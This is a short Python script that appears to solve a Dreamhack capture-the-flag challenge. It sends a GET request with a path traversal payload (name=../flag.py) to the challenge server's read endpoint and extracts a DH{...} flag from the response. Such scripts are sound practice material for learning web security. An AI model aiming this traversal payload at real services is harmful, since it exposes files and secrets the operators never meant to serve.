import re
from requests import request as req

res = req(
  url="http://host8.dreamhack.games:20905/read?name=../flag.py",
  method= "GET",
)

matched = re.search("DH{.*}", res.text)

print(matched.group() if matched else "NO FLAG")